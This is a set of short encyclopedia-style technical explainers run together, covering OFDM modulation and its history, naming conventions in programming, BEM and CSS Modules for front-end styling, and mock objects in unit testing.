CP is formed by copying bits at the end of an OFDM symbol .
Source : DSP Illustrations 2018 .
OFDM systems make use of guard band and cyclic prefix ( CP ) to overcome the issue of ISI .
While the guard band is not required to achieve the orthogonality of subcarriers , it helps in overcoming ISI in a multipath channel .
The duration of the guard band should be more than the channel spread of the wireless medium .
The cyclic prefix is transmitted during the guard band interval .
After IFFT , some end bits of the OFDM symbol are copied to the guard band before the symbol to form the CP .
Receivers often have a channel equalizer to combat channel distortion .
CP simplifies equalizer implementation .
Essentially , CP converts a linear convolution to a circular convolution .
Circular convolution in the time domain is equivalent to a simple multiplication in the frequency domain .
The channel equalizer in the receiver multiplies the received symbol by the inverse of the channel coefficients in frequency domain to recover the original transmitted symbol , assuming that fading is constant over the subband .
How is a typical OFDM transmitter and receiver implemented ?
OFDM Transceiver Block Diagram .
Source : Chapre et al .
2013 , fig .
1 .
In an OFDM transmitter , the input bits are first grouped into symbols in the frequency domain by using a serial - to parallel - converter .
These frequency domain symbols are then taken as input by the IFFT block .
The IFFT block converts the input symbol into a time domain symbol by doing an IFFT operation on the input .
The cyclic prefix is added to the output of the IFFT block by the cyclic prefix block .
This symbol is then converted back to a series of bits by the parallel - to - serial converter and transmitted .
In the OFDM receiver , the input signal is passed through the channel equalizer block first , to cancel any impairments introduced by the wireless channel .
The output of the equalizer is then input to the prefix extraction block to remove the cyclic prefix .
The output of the prefix extraction block is then given to the FFT block .
This block converts the input to frequency domain output by doing an FFT operation .
Thus , the OFDM receiver recovers the original bits back by doing a parallel - to - serial operation .
What are the advantages of OFDM ?
Here are some advantages : High spectral efficiency : Compared to other schemes like spread - spectrum , OFDM uses the available spectrum in a more efficient way .
Robust against multipath fading and Inter - Symbol Interference : Due to the low data - rate in each subchannel , OFDM is more resilient to inter - symbol interference caused by multipath propagation .
Simpler channel equalizer in receiver : In the case of OFDM the channel equalization can be done in the frequency domain and is a multiplication operation of the received symbol with the channel equalizer .
Efficient implementation : Implementation can be done using IFFT and FFT , thus eliminating the need for multiple mixers in the transmitter and receiver .
Robustness against selective fading : Since the transmission is done using multiple smaller subbands , frequency selective fading appears as flat fading for each subband .
Resilience to narrow band interference : Due to narrow band interference , content on some of the subchannels will be lost .
It is possible to recover it by using channel coding and interleaving data before transmission .
Tuned subchannel receivers not required : Unlike conventional FDM , tuned subchannel receivers are not required , thus simplifying the receiver design . What are the disadvantages of OFDM ?
Here are some disadvantages : Sensitive to carrier offset and frequency drift : In case there is an offset between the transmitter and receiver carrier frequencies , the orthogonal property of the OFDM is lost .
Thus , OFDM systems are very sensitive to carrier frequency offsets .
High Peak - To - Average power ratio : Since the output of multiple subbands are combined to get the OFDM signal , the OFDM signal has a very high dynamic range of amplitude .
This leads to complex RF design as the amplifiers need to be linear for the entire amplitude range .
This also leads to the lower efficiency of the RF amplifier .
Alexander Graham Bell was initially funded by his future father - in - law , Gardiner Hubbard , to work on harmonic telegraphy , which is an FDM transmission of multiple telegraph channels .
With FDM , more than one low rate signal is carried over a relatively wide channel using a separate carrier frequency for each signal .
Collins Radio Company develops the Kineplex system to overcome multipath fading .
20 tones are modulated by differential 4-PSK without filtering .
Tones can be separable by bank of filters at the receiver .
Franco and Lachs propose a multitone , code - multiplexing scheme using a 9-point QAM constellation for each carrier .
Sine and Cosine waves are used to generate orthogonal signals .
R.W. Chang illustrating reception of signals in subcarrier 5 .
Source : Chang 1966 , fig .
6 .
In what could be termed as the birth of modern OFDM , Robert W. Chang publishes the Synthesis of Band - Limited Orthogonal Signals for Multichannel Data Transmission .
He uses Fourier transform to make the subcarriers orthogonal .
His system is able to transmit signals in parallel without either ISI or ICI .
B.R. Saltzberg extends Chang 's work to complex data , that is , Quadrature Amplitude Modulation ( QAM ) .
He shows that I and Q streams should be staggered by T/2 , and adjacent channels the other way .
Zimmerman and Kirsch publish a paper on the design of an HF ( high frequency ) radio OFDM transceiver ( KATHRYN ) .
This uses 34 subchannels at a 3kHz bandwidth .
KATHRYN uses analog hardware to generate orthogonal signals using Discrete Fourier transform ( DFT ) .
Weinstein and Ebert use Fast Fourier Transform ( FFT ) implementation of DFT .
This greatly reduces the cost and complexity of OFDM systems .
However , Weinstein notes later , Bell Labs did n't show much interest in this .
The big applications of OFDM ( ADSL , wireless communications , digital audio / video broadcasting ) came years later .
Weinstein and Ebert also introduced the guard band for multipath channels .
Although earlier work made the subcarriers orthogonal , in a time dispersive channel the orthogonality was lost , resulting in ISI .
Peled and Ruiz solve this by introducing Cyclic Extension ( CE ) .
Today we use the more familiar term Cyclic Prefix ( CP ) .
Effective data rates are reduced , but the gain in terms of zero ISI is worth it .
For better channel estimation , L.J. Cimini introduces a pilot - based method to reduce interference from multipath and co - channels .
This work becomes important in the context of cellular mobile systems where channels experience fast selective fading .
Amati 's prototype of an ADSL modem won a competition with Carrierless Amplitude - Phase ( CAP ) Modulation in a Bellcore - sponsored test .
The technique used is Discrete Multi - Tone ( DMT ) , which is essentially OFDM .
Soon , ADSL became the first major consumer - oriented application of OFDM .
It uses 256-point DFT with subcarriers separated by 4.3125 kHz and a ( block ) symbol rate of 4000 / s .
Early deployments using Amati equipment happened with British Telecom in late 1993 and early 1994 , offering 2 Mbps downstream .
802.11a , the WLAN standard , was published as an amendment to 802.11 in 1997 .
It uses OFDM in the physical layer for data transmission .
802.11a 's OFDM has 52 subcarriers ( 4 pilot + 48 data ) , 64-point FFT , and 312.5 kHz of subcarrier spacing .
In general , code is written once but read multiple times , by others in the project team or even those from other teams .
Readability is therefore important .
Readability is nothing more than figuring out what the code does in less time .
Among the many best practices of coding is the way variables , functions , classes and even files are named in a project .
A common naming convention that everyone agrees to follow must be accompanied by consistent usage .
This will result in developers , reviewers and project managers communicating effectively with respect to what the code does .
While there are well - established naming conventions , there 's no single one that fits all scenarios .
Each programming language recommends its own convention .
Each project or organization may define its own convention .
Why should we have a naming convention and what are its advantages ?
Naming conventions are probably not important if the code is written by a single developer , who 's also the sole maintainer .
However , typical real - world projects are developed and maintained by teams of developers .
Particularly in the context of open source projects , code is shared , updated and merged by many individuals across organizations and geographies .
Naming conventions are therefore important .
Naming conventions result in improvements in terms of " four Cs " : communication , code integration , consistency and clarity .
The idea is that " code should explain itself " .
At code reviews , we can focus on important design decisions or program flow rather than argue about naming .
Naming conventions lead to predictability and discoverability .
A common naming convention , coupled with a consistent project structure , makes it easier to find files in a project .
In short , naming conventions are so important that Phil Karlton is said to have said , There are only two hard things in Computer Science : cache invalidation and naming things .
What are some common naming conventions used in programming ?
Among the common ones are the following : Camel Case : The first letter of every word is capitalized with no spaces or symbols between words .
Examples : ` UserAccount ` , ` FedEx ` , ` WordPerfect ` .
A variation common in programming is to start with lower case : ` iPad ` , ` eBay ` , ` fileName ` , ` userAccount ` .
Microsoft uses the term Camel Case to refer strictly to this variation .
Pascal Case : Popularized by Pascal programming language , this is a subset of Camel Case where the word starts with uppercase .
Thus , ` UserAccount ` is in the Pascal Case but not ` userAccount ` .
Snake Case : Words within phrases or compound words are separated with an underscore .
Examples : ` first_name ` , ` error_message ` , ` account_balance ` .
Kebab Case : Like Snake Case , but using hyphens instead .
Examples : ` first - name ` , ` main - section ` .
Screaming Case : This refers to names in uppercase .
Examples : ` TAXRATE ` , ` TAX_RATE ` .
Hungarian Notation : Names start with a lowercase prefix to indicate intention .
The rest of the name is in Pascal Case .
It comes in two variants : ( a ) Systems Hungarian , where prefix indicates data type ; ( b ) Apps Hungarian , where prefix indicates logical purpose .
Examples : ` strFirstName ` , ` arrUserNames ` for Systems ; ` rwPosition ` , ` pchName ` for Apps .
What are the categories of naming conventions ?
It 's common to categorize a naming convention as one of these : Typographical : This relates to the use of letter cases and symbols such as underscore , dot and hyphen .
Grammatical : This relates to the semantics or the purpose .
For example , classes should be nouns or noun phrases to identify the entity ; methods and functions should be verbs or verb phrases to identify action performed ; annotations can be any part of speech ; interfaces should be adjectives .
Grammatical conventions are less important for variable names or instance properties .
They are more important for classes , interfaces and methods that are often exposed as APIs .
What 's the typical scope of a naming convention ?
Naming convention is applicable to constants , variables , functions , modules , packages and files .
In object - oriented languages , it 's applicable to classes , objects , methods and instance variables .
With regard to scope , global names may have a different convention compared to local names ; such as , Pascal Case for globals : ` Optind ` rather than ` optind ` in Gawk .
Private or protected attributes may be named differently : ` _ secret ` or ` secret ` rather than ` secret ` .
Some may want to distinguish local variables from method arguments using prefixes .
Python 's PEP8 does n't give a naming convention to tell apart class attributes from instance attributes , but other languages or projects might define such a convention .
In general , use nouns for classes , verbs for functions , and names that show purpose for variables , attributes and arguments .
Avoid ( Systems ) Hungarian notation in dynamically typed languages since data types can change .
Use lower Camel Case for variables and methods .
Use Pascal Case for classes and their constructors .
Use Screaming Case for constants .
What word separators are used in naming conventions and who 's using what ?
With the Camel Case and Pascal Case , there are no word separators .
Readability is achieved by capitalizing on the first letter of each word .
Languages adopting this include Pascal , Modula , Java and .NET .
With Snake Case , the underscore is the separator .
This practice is common in Python , Ruby , C / C++ standard libraries , and WordPress .
With the Kebab Case , hyphen is the separator .
Languages using this include COBOL , Lisp , Perl 6 , and CSS .
Since hyphens in many languages are used for subtraction , Kebab Case is less common than Snake Case .
It 's common for a language to adopt different case styles for different contexts .
For example , a PHP convention named PSR-1 adopts the following : ` PascalCase ` for class names , ` UPPER_SNAKE_CASE ` for class variables and ` camelCase ` for method names .
Where can I find published naming conventions for different languages ?
Android resource naming convention .
Source : Mols 2016 .
Python defines its naming convention as part of PEP8 .
Beginners can read a summary .
Rust 's conventions are summarized in its official documentation .
It uses a Camel Case for type constructs and a Snake Case for value constructs .
Google offers its own naming convention for Java and for R .
Kotlin follows Java 's conventions and they 're summarized in its documentation .
.NET naming conventions are available online .
Resources in Android projects are defined in XML but without namespaces .
This makes it difficult to find stuff .
One suggested XML naming convention solves this problem .
For user interface design and names in CSS , BEM Methodology is worth studying .
Are there exceptions to following a common naming convention ?
Following a common naming convention is beneficial .
However , it may be okay to relax the rules in some cases .
When a name is highly localized , lacks business context or used within a few lines of code , it may be acceptable to use a short name ( ` fi ` rather than ` CustAcctFileInfo ` ) .
When a project is written in multiple languages , it 's not possible to have a single naming convention .
For each language , adopt the naming convention prevalent in that language .
Another example is when you 're using a third - party library .
Follow their convention for consistency and readability .
Ultimately , naming conventions should not be enforced blindly .
We should be sensitive to the context of use .
This is partly because IDEs come to the aid of developers .
They can highlight the name in all places it occurs .
The practice of prefixing member and static variables with ` m ` and ` s ` respectively is also not in favour since IDEs colour them differently .
Could you give some tips to create a naming convention ?
Common naming conventions in Java .
Source : Kumar 2017 .
Without being exhaustive , here are some things to consider : Reveal intentions : ` fileName ` is better ` f ` ; ` maxPugs ` is better than ` pugs ` .
Make distinctions : ` moneyInDollars ` is better than ` money ` .
Put the distinguishing aspect first : ` dollarMoney ` and ` rupeeMoney ` are better than ` moneyInDollars ` and ` moneyInRupees ` .
Easy to pronounce : ` timeStamp ` is better than ` ts ` .
Verbs for functions : ` getName ( ) ` and ` isPosted ( ) ` are good ; ` hasWeight ( ) ` or ` isMale ( ) ` when boolean values are returned ; ` toDollars ( ) ` for conversions .
One word , one concept : ` fetch ` , ` retrieve ` , ` get ` all imply the same thing : use one of them consistently .
Relate to business context : ` AddCustomer ` is better than ` IncrementCounter ` .
Use shortforms judiciously : ` PremiumCust ` may be used over ` PremiumCustomer ` to emphasize " Premium " ; but ` fn ` is not a good substitute for ` fileName ` .
Describe content rather than storage : ` user_info ` is better than ` user_list ` .
Plurals for containers : ` fruitNames ` is better than ` fruit ` for an array of fruit names .
Describe content rather than presentational aspects : in CSS , for example , ` main - section ` is better than ` middle - left - and - then - a - little - lower ` as identifier name .
An early use of Camel Case , more formally called medial capitals , starts in chemistry .
Swedish chemist Jacob Berzelius invented it to represent chemical formulae .
For example , Sodium Chloride is easier to read as ` NaCl ` than ` Nacl ` .
The use of Snake Case can be traced to the late 1960s .
In the 1970s , it was used in C language , while Pascal used what was later called Pascal Case .
However , the name Snake Case itself was coined in the early 2000s .
The 1970s is when Camel Case started to become common in the world of computer programming .
However , the name itself was coined years later ( in 1995 ) and is attributed to Newton Love .
Apps with Hungarian notation applied in Selenium - Java .
Source : Pragmatic Test Labs 2018 .
In the 1980s , Charles Simonyi , a Hungarian working at Microsoft , invented the notation of using lowercase prefixes for names to indicate what the name referred to .
Thus is born ( Apps ) Hungarian Notation .
Unfortunately , some mistakes with Simonyi 's idea and the use of prefixes to indicate data types .
This is born Systems Hungarian .
While Apps Hungarian is useful , Systems Hungarian is not , particularly in type safe languages .
When Microsoft started working on .NET in the late 1990s , they recommended not using Hungarian notation .
A variety of conventions across R projects .
Source : Bååth 2012 , fig .
1 .
The R language does n't officially specify a naming convention .
Therefore , multiple conventions exist .
An analysis of 2668 R packages downloaded from CRAN shows a lack of consistency .
In fact , 28 % of packages use three or more conventions .
BEM logo .
Source : P. Silva 2016 .
When updating web / mobile user interfaces , front developers often worry about breaking existing code or introducing inconsistencies .
Selecting elements on a UI is often problematic because of long cascading rules , nested styles , rules that are unnecessarily high in specificity , and naming everything in the global namespace .
BEM provides a modular approach to solving these problems .
BEM is a methodology , an approach and a naming convention to write better CSS styling and achieve consistent JS behaviour .
BEM stands for Block , Element and Modifier .
These three are called BEM Entities .
BEM is not a W3C standard but it 's recommended by those who have adopted it and reaped its benefits .
Among its adopters are Yandex , Google , BBC , Alfa Bank , and BuzzFeed .
BEM also works nicely with CSS languages ( Sass , etc .
) , and front frameworks ( React , etc .
) .
Could you explain BEM with an example ?
An overview of BEM .
Source : Adapted from BEM 2019b .
BEM is a component - based approach to designing a user interface for the web / mobile .
For example , we can identify components such as header , menu , logo , search and login on a typical web page .
In BEM , we call these components blocks , each having a well - defined purpose or semantics .
It 's also apparent that a block can contain other blocks within it .
However , each block is also independent of other blocks and can be reused elsewhere .
For example , it 's not necessary that the login block must be part of the header block .
It could be moved to a sidebar in a redesigned page layout .
Blocks can also contain elements that can not exist outside their parent blocks .
For example , a menu block is composed of menu items , each of which is an element in BEM terminology .
Finally , an element within a block can be selectively modified depending on the context .
For example , in a menu block , the active menu item could be styled differently .
This modification is done using modifiers .
Modifiers are optional .
What are the advantages of adopting the BEM methodology ?
Problems solved by BEM .
Source : Tadatuta 2019 .
BEM enables flexible maintainable code .
Components can be reused .
The code has become more consistent since the rules are clear .
It 's easier to scale to large projects .
Teamwork is easier because everyone is familiar with BEM conventions .
Since the approach is based on independent blocks , work can be clearly partitioned , with each team member working on a different block .
More specifically , every BEM CSS class is unique and self - sufficient .
BEM does n't need nesting styles .
We do n't need long and inefficient selectors to match specific elements .
BEM avoids name collisions due to its consistent naming convention .
The naming convention also makes the CSS self - documenting : the relationships among DOM nodes are easier to see .
DOM nodes are selected more efficiently with managed specificity .
What are the default naming conventions followed in BEM ?
Let 's consider the following : ` block - nameelem - name_mod - name_mod - val ` .
We note that names are all in lowercase , underscores are used as separators between BEM entities , and hyphens are used within names for better readability .
We use double underscore to separate block from element ; single underscore to separate block / element name from its modifier ; single underscore to separate modifier name and modifier value .
Consider these examples : ` main - menu_hidden ` : main - menu is the block , hidden is the modifier .
` menu_theme_islands ` : menu is the block , theme is the modifier , islands is the theme being specified ( modifier value ) .
` menuitem_type_radio ` : menu is the block , item is its element , type is the item 's modifier , radio is the modifier 's value .
` main - menuitem_black - listed ` : main - menu is the block , item is its element , black - listed is the item 's modifier .
What other naming conventions are common in the BEM community ?
Kevin Powell explains the Two Dashes convention .
Source : Powell 2018 .
While there 's a default naming convention in BEM , you can create your own convention .
Most importantly , the convention should clearly separate blocks , elements and modifiers .
Other than the default one , the following conventions are used in the BEM community : Two dashes : ` block - nameelem - name -- mod - name -- mod - val ` : double hyphens are used between elements , modifiers and values .
CamelCase : ` blockName - elemName_modName_modVal ` React : ` BlockName - ElemName_modName_modVal ` No Namespace : ` _ modname ` : no reference to block or element and hence of limited usefulness .
What technologies assist in implementing BEM ?
A block is not just about CSS .
It encapsulates behaviour ( JavaScript ) , templates , styles ( CSS ) , documentation , and other implementation technologies .
Developers can adopt any implementation technology of their choice .
As a sample , we note the following : Styling : CSS , Stylus , Sass Behaviour : JavaScript , CoffeeScript Templates : BEMHTML , BH , Pug , Handlebars , XSL Documentation : Markdown , Wiki , XML Could you share some BEM best practices ?
An important principle of BEM is to avoid selectors based on ID or tag name .
Only class names are used , and these can be reused easily regardless of the tag .
It 's also allowed to use multiple BEM entities on the same DOM node .
We can use nesting in BEM but it 's not recommended .
Nesting increasing code coupling and inhibits reuse .
Likewise , combined selectors ( eg .
` .btn.btn_error ` ) are not recommended .
Use only a single double underscore in a name : ` c - card&lowbar;_img ` rather than ` c - cardbody_&lowbar;img ` .
Use namespaces to improve readability : ` c- ` for component , ` l- ` for layout , ` h- ` for helpers , ` is- ` or ` has- ` for states , ` js- ` for JavaScript hooks .
External geometry and positioning ( such as padding ) should be done on the parent node so that the current block can be reused elsewhere .
Use mixes to apply the same style to multiple DOM nodes .
This approach is better than using group selectors .
Take an object - oriented approach to design .
Design in terms of reusable blocks .
Use principles such as single responsibility principle and open / closed principle .
Do n't repeat yourself ( DRY ) .
Prefer composition over inheritance .
Organize your files into a clear folder structure .
What are some criticisms of BEM ?
Since BEM avoids the use of IDs or tag names , class names have to be unique .
Giving these names can be a difficult task .
Long class names bloat markup .
To reuse UI components , we need to explicitly extend them .
As an example , a modifier will need its own class name , but giving names for each DOM node that needs to be styled with this modifier can be cumbersome .
An alternative is to use utility classes , named with ` u- ` prefix .
The trade - off is that this will result in nested CSS .
Thus , a DOM node is selected as ` menu&lowbar;_item u - active ` rather than ` menu_&lowbar;item - active ` .
Since DOM nodes are marked with BEM entities , BEM creates a semantic overlay on the DOM .
This is called BEM Tree .
While some regard this as a useful thing , others claim that BEM unnecessarily makes the markup semantic .
The first version of Cascading Style Sheets ( CSS ) comes out as a W3C Recommendation .
The idea of having style sheets can be traced to Tim Berners - Lee , who used them in his NeXT browser ( 1990 ) , and Pei Wei 's Viola browser ( 1992 ) .
Håkon Wium Lie released an initial draft in October 1994 .
At Yandex , developers find that for large projects , layouts are becoming difficult to maintain .
Long cascading rules and dependencies cause changes in one web page to affect many others .
To solve this , they introduced the concept of blocks .
A block is part of a page or layout defined semantically or visually .
A block is given a unique CSS class name .
Nodes within blocks are called elements .
For example , the logo is an element with a header block .
Block names use prefixes to emulate namespaces .
Each prefix has its own semantics : ` b- ` for blocks , ` h- ` for block wrappers , ` l- ` for layouts , ` g- ` for global styles .
This is also when modifiers are introduced to indicate block state or property .
Modification can be context - dependent , such as location , or context - independent .
With the release of Lego 2.0 , the unified styling framework at Yandex , BEM is formally born .
Blocks are primary units .
A block can be used anywhere on the page .
Each block is stored in a separate folder with its own documentation .
Blocks used are noted in XML files and used to generate CSS files .
Folks at Yandex invented Absolutely Independent Blocks ( AIB ) to solve the problem of slow DOM updates .
Each DOM node has its own class .
Tag rules are avoided in CSS .
BEM is open source along with some essential BEM tools .
CSS Modules were born with the initial commit happening in May 2015 .
BEM requires developers to choose unique class names and does not provide encapsulation .
CSS Modules solve this by dynamically creating class names and localising styles .
Thus , tooling is just as important as conventions .
CSS Modules do n't replace BEM .
It makes it easier to implement BEM .
CSS Modules logo .
Source : css - modules GitHub 2017a .
CSS was invented to style web pages .
A typical web page contains many elements or components such as menus , buttons , input boxes , and so on .
Styles defined in a CSS file are accessible on the entire web page in which that file is included .
In other words , all style definitions have global scope .
What if we want some styles to be visible only to one component of the page ?
CSS was defined to style documents , not UI components .
The lack of modularity in the CSS language makes it hard to maintain complex or legacy code .
Developers are afraid to make code changes since it 's easy to break something when CSS definitions are global .
CSS Modules solve these problems by limiting the scope for components .
CSS modules are not an official standard .
It 's a community - led effort popularized by the ReactJS ecosystem .
What are the problems that CSS modules solve ?
The problem of global scope is solved by CSS Modules since class names are local to the component .
The same class name can be used in another component with different styling .
Even though CSS as a standard has only global scope for names , CSS Modules leverages on tooling .
Tools convert local names to globally unique names .
Deeply nested CSS selectors result in what we call high specificity .
This impacts performance .
With CSS Modules , names are globally unique and locally specific .
Hence , flat selectors are more than sufficient .
Because CSS styles are now encapsulated within components , code becomes more maintainable .
Code can be refactored .
dead code can be removed .
What are the essential features of CSS modules ?
CSS Modules have the following features : Local Scope : Class names and animation names are locally scoped by default .
Global Scope : Using the ` : global ` switch , developers can choose to reuse some styles globally .
Composition : A selector can extend styles from another , thus promoting reuse of styles within local scope .
Composition ca n't be used for global scope .
A selector can be composed from a selector in global scope or selectors in other files .
Naming : Names should be in camelCase .
Though the traditional CSS naming convention is to use kebab - case , hyphens can cause problems when accessed within JavaScript .
The use of camelCase simplifies the syntax .
Integration : CSS Modules should have tooling support to compile CSS to a low - level format called Interoperable CSS ( ICSS ) .
It should also work nicely with CSS processors ( Less , Sass , PostCSS ) , bundlers ( Webpack ) and JS frameworks ( Angular , React ) .
Could you explain how CSS modules work ?
CSS is compiled to CSS / JS with renamed class names .
Source : Farmer 2016 .
CSS as a language does n't support local scopes .
All names have global scope .
To overcome this limitation , developers use tools to automatically transform local names into globally unique names .
These names are generated by the CSS Modules compiler .
The compiler also generates a JS object to map old names to new names .
Therefore , developers can continue to use local names in their component code .
For example , let 's take an UI component called " Cat " .
Its styles are in the file " Cat.css " where ` .meow ` is defined .
It 's possible that the same class is used in another component , let 's say , " WildCat " .
To avoid this name conflict , the CSS Modules compiler makes each name unique .
CSS modules are flexible .
It does n't impose a specific naming convention .
In our example , the new class name is ` .cat_meow_j3xk ` , where the module name is used as a prefix and a hash value is used as a suffix .
The mapping from old to new names goes into a JS object .
What tools and plugins help with implementing CSS modules ?
Webpack 's css - modules or PostCSS 's postcss - modules can be used to implement CSS modules .
PostCSS can be used along with task runners such as Gulp or Grunt .
PostCSS is really using JS plugins to transform CSS .
To tell Webpack how to load CSS files , there is a css - loader and style - loader .
These may be enough to use CSS Modules with Angular , TypeScript and Bootstrap .
With Browserify , the plugin to use is css - modulesify .
For use in Rails , there 's cssm - rails .
With JSPM , there 's jspm - loader - css - modules .
CSS Modules can be used within JS frameworks .
For React , there are react - css - modules or babel - plugin - react - css - modules .
CSS preprocessors such as SCSS can be used along with CSS Modules using sass - loader .
Gatsby is another example where CSS modules can be used .
To catch problems early , there 's eslint - plugin - css - modules .
Are there alternatives to using CSS modules ?
Comparing CSS Modules with other approaches .
Source : Rahangdale 2018 .
Historically , CSS started as a single file for an entire app .
Thanks to tools such as Webpack 's css - loader , it has become possible to use one stylesheet file per component .
Each component 's folder contained its CSS and JS files .
However , styles still have global scope .
The Global scope was partially solved by OOCSS , SMACSS , BEM , etc .
Block - Element - Modifier ( BEM ) brought some modularity to CSS via a naming convention .
It solved the CSS specificity problem .
However , class names were long and had to be named by developers .
With CSS Modules , naming is taken care of by the build tools .
During coding , developers use simpler and more intuitive names .
We can customize class names , including the use of BEM - style naming if desired .
CSS in JS embeds CSS directly into a JS file .
The CSS model is at component level rather than at document level .
For example , in JSS , styling is defined as JS objects .
In another library called styled - components , tagged template literals are used .
Michele Bertoli has a curated comparison list of many CSS - in - JS techniques .
Is n't W3C standardizing CSS Modules ?
No .
CSS modules are not a standard .
It does n't change the CSS specifications in any way .
CSS definitions retain global scope but CSS Modules make them " behave locally " by renaming them with unique names , which are then referenced by their components in HTML or JS .
This is possible because of tooling support .
Beginners may confuse CSS Modules with another concept called CSS3 modules .
In June 2011 , CSS2.1 became a W3C Recommendation .
However , this process took 13 long years , mainly because the specification was a monolith .
When work started on CSS3 , it was therefore decided to split the specifications into separate modules .
Each module can take its own path of standardization .
These modules are not related to CSS Modules .
A related concept is the use of namespaces in CSS .
These refer to XML namespaces and how these can be used within CSS selectors .
The HTML ` style ` element has the ` scoped ` attribute for local scoping but this is now deprecated .
What are some criticisms of CSS modules ?
It 's been said that CSS Modules does nothing more than automate class naming so as to avoid name collisions .
Developers can still do wrong things without CSS Modules warning them about it .
It 's not clear if typo errors will be caught at compile time or runtime .
You ca n't share constants across CSS and JS files .
TypeStyle is one approach that solves some of these issues .
It mimics CSS Modules pattern using JS objects .
Back in 2016 , one developer commented that CSS modules are not ready for prime time .
He mentions some limitations to using ` @value ` and ` composes ` .
He states that using pseudo - selectors can be unreliable .
The use of camelCase that 's not typical of CSS naming convention is seen as a limitation .
While some frameworks may have plugins to solve some of these issues ( such as babel - plugin - react - css - modules ) , it may prove difficult to make CSS modules work with others .
Facebook released a JavaScript library called ReactJS .
The design approach is modular , with a web page being built from a hierarchy of UI components .
Two years later , the project is open source .
Version 0.1.0 of css - loader for Webpack has been released in the NPM repository .
This gives control over how CSS is loaded into a project .
This becomes useful when CSS is used directly within an UI component implemented in JS .
CSS problems at scale .
Source : Chedeau 2014 , slide 2 .
Christopher Chedeau , a frontend developer at Facebook , lists a number of problems with CSS at scale .
He states that while JS recommends avoiding global variables , CSS still uses global names .
Facebook initially solves many of the issues by extending CSS and later by using inline styles .
Styles are specified as JS objects within UI components .
Mixing content and styling might seem like a bad approach , but every component encapsulates its own styling without relying on global variables .
The common name for this approach is CSS in JS .
Webpack 's css - loader starts supporting local scope with the use of the ` : local ` switch .
A month later , some folks implemented a module for PostCSS called postcss - local - scope , so that CSS styles are local by default even without using the switch .
Only globals need to be explicitly specified with the ` : global ` switch .
The PostCSS module postcss - local - scope gets integrated into the css - loader of Webpack .
Meanwhile , initial committing of CSS Modules happens on GitHub .
The low - level file format that enables CSS Modules is specified separately as Interoperable CSS ( ICSS ) .
This has become the common format for module systems .
The specifications are meant for loader implementers , not end users .
Meanwhile , ICSS is implemented in loaders including css - loader ( webpack ) , browersify , and jspm .
Mocking external components .
Source : SoapUI 2019 .
Mock testing is an approach to unit testing that lets you make assertions about how the code under test is interacting with other system modules .
In mock testing , the dependencies are replaced with objects that simulate the behaviour of the real ones .
The purpose of mocking is to isolate and focus on the code being tested and not on the behaviour or state of external dependencies .
Let 's say , a notification service triggers an email service .
We do n't want to send emails each time we run a notification test .
However , we want to verify what the email - sending service is called .
Such a service can be replaced with a mock object .
Where is mock testing useful ?
Common uses of mocking .
Source : SoapUI 2019 .
Mocking is generally useful during unit testing so that external dependencies are no longer a constraint to the unit under test .
Often , those dependencies may themselves be under development .
Without mocking , if a test case fails , it will be hard to know if the failure is due to our code unit or due to dependencies .
Mocking therefore speeds up development and testing by isolating failures .
Other reasons to mock dependencies are to avoid slow network calls or calling third - party APIs .
Mocking also enables product demos and evaluations .
All units of a project can progress in parallel without waiting for everyone to be ready .
Thus , testing can start early .
Code that has side effects should be called only in production .
Examples include charging a credit card or sending a notification .
Mocking is useful to validate such calls without the side effects .
Mocking avoids duplicating test code across similar tests .
The task of verifying method or API calls from our module can be delegated to the mock .
Could you give some examples of mock testing ?
Use of the Mock Network Provider avoids external API calls .
Source : Agostini 2017 .
Let 's say , an Order class fulfils orders by calling a Warehouse class .
The latter knows the current inventory .
If we are in unit testing Order class , we mock the Warehouse .
We do n't care about testing Warehouse right now .
But since it 's a dependency for order , we mock it .
Our mock object can be called WarehouseMock .
A mock object provides a pseudo implementation of the same interface as the real object .
Those calling it are unaware that it 's a mock .
Thus , to the Order class , WarehouseMock looks the same as Warehouse .
This is just what we need for unit test Order class .
Another example is about an application called an external API to get information about movies .
Instead of making real calls , this can be mocked so that when API calls are made , the mock object will simply read and respond with test data from a local file system .
Does mocking require developers to modify their codebase ?
If your code uses static objects or singletons , then it 's difficult to do mocking .
In such cases , it 's better to refactor code .
Otherwise , in general , mocking does n't require you to modify the codebase .
In fact , dependency injection is the usual way in which objects should be created .
Dependencies become visible in the constructors and other methods .
These dependencies can therefore be easily replaced during testing with mock objects .
This can be configured either in code or via a configuration file .
How is mock testing different from traditional unit testing ?
Mocks replace actual door and window objects .
Source : Lipski 2017 .
In traditional unit testing , unit tests do assertions about states expected of either the system under test or its dependencies .
With mock testing , no assertions are required from the unit tests themselves .
Assertions are done by using mock objects .
These objects are initialized in advance about what method calls are expected and how they should respond .
While unit tests are more about state - based verification , mock testing is more about behaviour - based verification .
For example , let 's assume that SecurityCentral is being tested .
It depends on the door .
When SecurityCentral activates full security , unit testing will verify the final state of the door , that it 's closed .
Mocking would instead verify that the correct method was invoked with expected arguments , such as ` Door.close ( ) ` .
Mocks register the calls they receive so these can be asserted .
What are the common types of mock testing ?
In proxy - based mocking , a proxy object is used instead of the original object .
The proxy may handle all calls to the original object or selectively forward some calls .
Mock frameworks such as EasyMock , JMock , Mockito offer this type of mocking .
However , there may be limitations in terms of proxying ` static / private / final ` methods or a ` final ` class .
In classloader - remapping - based mocking , a class loader remaps the reference .
Thus , it loads the mock object rather than the original one .
Mock frameworks such as JMockit and PowerMock support this .
This overcomes the limits of proxy - based mocking .
In Swift language , one developer blogged that he uses two ways to do mocking : instance injection and configuration injection .
The former is simpler but it ca n't handle static objects .
What are some best practices for mock testing ?
Here are some best practices for mocking : Only mock types that you own : External types have dependencies on their own .
They might even change their behaviour in a future version .
Instead , create an adapter and mock that adapter .
Do n't mock values : Values should not be mocked .
Mocking aims to make the relationships and interactions between objects visible .
Getting a value is not an interaction .
Avoid mocking concrete classes : Relationships are easier to see via interfaces rather than concrete classes .
We might end up mocking some methods but forgetting others .
Mock roles , not objects .
Do n't mock everything : This is an anti - pattern .
If everything is mocked , we may end up testing something quite different from a production system .
Use integration tests : When testing multiple modules or if you 're interested in data coming from an external database , you should do integration testing rather than mocking .
Negative tests : Use mocks to simulate errors and test error handling .
Use mocks to verify that some methods / APIs are not called .
What are some mocking frameworks ?
While it 's possible to manually write mock objects , mocking frameworks simplify the task .
Mockito is an open source testing framework for Java .
Mockito is claimed to be one of the popular ones .
JustMock and MOQ package are useful for .NET developers .
.
There 's also JustMock Lite when dealing with loosely coupled codes .
Wiremock is suitable for mocking HTTP - based APIs .
For C++ developers , there 's TypeMock and Google Mock .
The latter is part of the GoogleTest .
